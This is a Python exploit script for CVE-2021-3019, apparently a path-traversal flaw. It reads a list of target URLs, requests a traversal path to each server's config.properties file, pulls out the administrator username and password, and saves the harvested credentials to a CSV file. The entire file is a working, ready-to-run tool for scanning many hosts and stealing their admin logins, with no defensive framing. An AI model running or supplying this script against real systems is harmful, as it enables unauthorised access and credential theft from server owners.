# -*- coding: UTF-8 -*-

import requests
import sys



banner='''
  _______      ________    ___   ___ ___  __       ____   ___  __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |     |___ \ / _ \/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) || |______ __) | | | || | (_) |
| |      \ \/ / |  __|______/ /| | | |/ / | |______|__ <| | | || |\__, |
| |____   \  /  | |____    / /_| |_| / /_ | |      ___) | |_| || |  / / 
 \_____|   \/   |______|  |____|\___/____||_|     |____/ \___/ |_| /_/    by:Максим                             
'''
print(banner+'\n\n')

try:
    txt = sys.argv[1]
    try:
        source = open(txt, 'r', encoding='UTF-8')
        urls = source.read().split('\n')
        source.close()
        try:
            poc = r'/..%2Fconf%2Fconfig.properties'
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
            hang = 0
            zong = len(urls)
            file_handle = open(r'CVE-2021-3019.csv', mode='w', encoding='UTF-8')
            file_handle.writelines("ID,URL,User,Password" + '\n')
            id = 1
            if urls == "":
                print('Error:文件内容为空!')
            else:
                while zong > hang:
                    try:
                        res = requests.get(urls[hang] + poc, headers=headers, timeout=5, verify=False)
                        if res.status_code == 200:
                            if 'config.admin.password' in res.text:
                                webend = res.text.split('\n')
                                user = webend[13].split('=')
                                passwrd = webend[14].split('=')
                                print(str(hang+1) + '  ' + urls[hang] + '  ' + user[1] + '  ' + passwrd[1])
                                file_handle.writelines(str(id) + ',' + urls[hang] + ',' + user[1] + ',' + passwrd[1] + '\n')
                                id = id + 1
                    except requests.exceptions.ConnectionError:
                        print(str(hang+1) + '  ' + 'ConnectionError')
                    except requests.exceptions.ReadTimeout:
                        print(str(hang+1) + '  ' + 'ConnectionTimeout')

                    hang = hang + 1
            file_handle.close()
            print('请查看CVE-2021-3019.csv')
        except KeyboardInterrupt:
            print('程序中止')

    except FileNotFoundError:
        print("Error:参数错误!\nExample:Python CVE-2021-3019.py url.txt")
except IndexError:
    print("Error:参数为空!\nExample:Python CVE-2021-3019.py url.txt")



#print(res.text)
#if res.status_code==200

